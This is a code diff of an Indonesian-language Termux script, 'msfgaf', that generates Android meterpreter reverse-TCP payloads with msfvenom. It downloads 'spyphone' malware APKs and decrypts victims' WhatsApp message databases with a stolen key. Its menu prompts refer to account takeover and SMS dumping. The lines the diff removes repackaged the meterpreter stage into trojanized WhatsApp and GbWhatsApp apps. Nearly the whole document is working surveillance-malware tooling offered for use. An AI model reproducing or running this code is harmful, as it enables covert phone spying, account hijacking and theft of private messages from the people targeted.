@@ -1,12 +1,11 @@
 # -*- coding: utf-8 -*-
 
-
+import requests
 import os
 import time
 import sys
 import random
-import shutil
-
+from termcolor import colored
 
 putih="\x1b[1;97m"
 merah="\x1b[1;91m"
@@ -98,47 +97,6 @@ def payload():
 		print ' '
 	print hijau+'PLEASE WAIT 5 - 20 Minutes...' 
 	os.system("msfvenom -p android/meterpreter/reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" -o Malware/payload.apk")
-	
-def httpcustom():
-	os.system("cd Malware && rm -rf payload.apk payload A")
-	os.system("git clone https://github.com/PyRAT-svg/HttpCustom &&mv -f HttpCustom Malware")
-	os.rename('Malware/HttpCustom', 'Malware/A')
-	payload()
-	os.system("cd Malware && apktool d payload.apk -o payload")
-	os.system("rm -rf Malware/A/README.md  Malware/A/.git Malware/A/smali/xyz/metasploit/stage")
-	os.system("mv -f Malware/payload/smali/com/metasploit/stage Malware/A/smali/xyz/metasploit/")
-	os.system("cd Malware && apktool b A -o HttpCustom.apk")
-	os.system("cd Malware && rm -rf payload.apk payload A")
-	os.system('mv -f Malware/HttpCustom.apk /storage/emulated/0/')
-	os.system('am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity')
-
-def gbwa():
-	os.system("cd Malware && rm -rf payload.apk payload A")
-	os.system("git clone https://github.com/PyRAT-svg/GbWhatsApp &&mv -f GbWhatsApp Malware")
-	os.rename('Malware/GbWhatsApp', 'Malware/A')
-	payload()
-	os.system("cd Malware && apktool d payload.apk -o payload")
-	os.system("rm -rf Malware/A/README.md  Malware/A/.git Malware/A/smali/com/metasploit/stage")
-	os.system("mv -f Malware/payload/smali/com/metasploit/stage Malware/A/smali/com/metasploit/")
-	os.system("cd Malware && apktool b A -o GbWhatsApp.apk")
-	os.system("cd Malware && rm -rf payload.apk payload A")
-	os.system('mv -f Malware/GbWhatsApp.apk /storage/emulated/0/')
-	os.system('am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity')
-	
-		
-def wa():
-	os.system("cd Malware && rm -rf payload.apk payload A")
-	os.system("git clone https://github.com/PyRAT-svg/WhatsApp&& mv -f WhatsApp Malware")
-	os.rename('Malware/WhatsApp', 'Malware/A')
-	payload()
-	os.system("cd Malware && apktool d payload.apk -o payload")
-	os.system("rm -rf Malware/A/README.md  Malware/A/.git Malware/A/smali/com/metasploit/stage")
-	os.system("mv -f Malware/payload/smali/com/metasploit/stage Malware/A/smali/com/metasploit/")
-	os.system("cd Malware && apktool b A -o WhatsApp.apk")
-	os.system("cd Malware && rm -rf payload.apk payload A")
-	os.system('mv -f Malware/WhatsApp.apk /storage/emulated/0/')
-	os.system('am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity')
-
 
 def spyphone_V14():
 	os.system("wget https://github.com/PyRAT-svg/Malware/raw/master/spyphone_V14.apk && mv -f spyphone_V14.apk Malware/spyphone.apk")
@@ -153,9 +111,7 @@ def spyphone_V14():
 	os.system("cd Malware && rm -rf payload.apk payload spyphone")
 	os.system('am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity')
 	os.system('mv -f Malware/spyphone_V14.apk /storage/emulated/0/')
-		
 
-	
 def spyphone():
 	os.system("wget https://github.com/PyRAT-svg/Malware/raw/master/spyphone.apk && mv -f spyphone.apk Malware/spyphone.apk")
 	os.system("cd Malware && rm -rf payload.apk payload spyphone")
@@ -176,7 +132,8 @@ def extract_wa():
 	time.sleep(1)
 	print ' '
 	print hijau+'------------------------------------'
-	flush('Ambilkan saya Key&Database')
+	flush('Ambil alih akunya ')
+	flush('dump_sms')
 	print '-------------------------------------'
 	flush('saya akan berikan yang kamu inginkan')
 	print '-------------------------------------'
@@ -188,14 +145,24 @@ def extract_wa():
 	else :
 		if zedd == 'n':
 			home()
-	os.system('git clone https://github.com/PyRAT-svg/decryptor12 &&mv decryptor12 d')
-	files = ['msgstore.db.crypt12','key']
-	for f in files:
-		shutil.move(f, 'd')
+	os.system('chmod +x link.txt')
+	os.system('cat *txt | grep -o [a-z.]*/[0-9][0-9][0-9][0-9][0-9][0-9] > link.txt')
+	f= open("link.txt")
+	if f.mode == "r":
+		link = f.read()
+		os.system('termux-open '+f.read())
+	else:
+		print merah+'[!] tidak bisa membaca kode'
+		home()
+	os.system('git clone https://github.com/PyRAT-svg/decryptor12 &&mv -f decryptor12 d')
+	os.system('cp msgstore.db.crypt12 d/msgstore.db.crypt12 ')
+	os.system('cp key d/key')
 	os.system('cd d && php decrypt.php msgstore.db.crypt12 key') 
-	os.system('cd d/src &&mv msgstore.db /storage/emulated/0/BackupTextForWhatsApp/msgstore.db')
-	os.system('mv msgstore.enc /storage/emulated/0/BackupTextForWhatsApp/msgstore.enc')
-	os.system('cd d &&mv -f key ..')
+	os.system('cd d/src &&mv msgstore.db /storage/emulated/0/BackupTextForWhatsApp/msgstore.db && cp msgstore.db msgstore.enc')
+	os.system('cd d &&mkdir /storage/emulated/0/msfgaf && mv -f key /storage/emulated/0/key')
+	flush('key tool saved in storage')
+	time.sleep(2)
+	flush('cleaning..')
 	os.system('rm -rf d')
 	os.system('am start --user 0 -n com.smeiti.wstotexu/com.smeiti.wstotexu.WStoTextActivity')
 	back()
@@ -216,15 +183,18 @@ def pilmal():
 			if zedd == '2':
 				spyphone_V14()
 			else:
-				if zedd == '3':
-					print merah+'script dalam perbaikan'
-				else :
-					if zedd == '4':
-						print merah+'script dalam perbaikan'
-					else :
-						print '\x1b[1;91m[!] Pilih 1-2'
-						os.system('clear')
-						awal()
+				print '\x1b[1;91m[!] Pilih 1-2'
+				os.system('clear')
+				awal()
+				#if zedd == '3':
+					#print merah+'script dalam perbaikan'
+				#else :
+					#if zedd == '4':
+						#print merah+'script dalam perbaikan'
+					#else :
+						#print '\x1b[1;91m[!] Pilih 1-2'
+						#os.system('clear')
+						#awal()
 						
         
 def malware():
@@ -233,15 +203,15 @@ def malware():
     os.system('figlet Malware |lolcat')
     print '\x1b[1;91m1.\x1b[1;97mSpyphone'
     print '\x1b[1;91m2.\x1b[1;97mSpyphone_V14'
-    print '\x1b[1;91m3.\x1b[1;97mGbWhatsApp'+cyan+' *New '
-    print '\x1b[1;91m4.\x1b[1;97mWhatsApp'+cyan+' *New '
     print '\r\x1b[1;91m__________________________________________«Back» '
     
         	
 
 
 def logo():      
-	os.system('figlet msf - gaf |lolcat')
+	f = open('asci.txt')
+	print colored(f.read(),'yellow')
+	f.close
 	print '---------------------------------------------------'
 	print cyan+' Author  : '+green+'Gafar Risky {PyRAT-svg}   '
 	print cyan+' Github  : '+green+'http://github.com/PyRAT-svg/msfgaf '
@@ -254,7 +224,7 @@ def remote():
     os.system("clear")    	
     logo()
     print (''+putih)
-    os.system('ifconfig')
+    os.system('ifconfig | grep -o [0-9][0-9][.][0-9][.][0-9][0-9][.][0-9][0-9][0-9] > ip.txt')
     print ('')
     print (merah+'___________________«»')
     
@@ -262,26 +232,18 @@ def remote():
     print "\x1b[1;91m----------------------------------------------"
     print " pastekan IP Tun0 inet disini"
     lh =raw_input(" LHOST : ")
-    os.system("clear")
     if lh== '':
       logo()
       print merah+"[!] Harus DiIsi"
       time.sleep(1)
       os.system("clear")
       remote()
-    else :
-      os.system("clear")
-    
-    os.system("clear")
-    logo()
     print "\x1b[1;97mMasukan LPORT"
     print "contoh"
     print "tcp://gafar97port-53967.portmap.io:53967=>\x1b[1;91m8080"
     print "\x1b[1;91m                                            ^"
     print "----------------------------------------------"
-    lp =raw_input("LPORT : ")
-    os.system("clear")
-    
+    lp =raw_input("LPORT : ")    
     if lp== '':
       print "[!]Harus DiIsi"
       time.sleep(1)
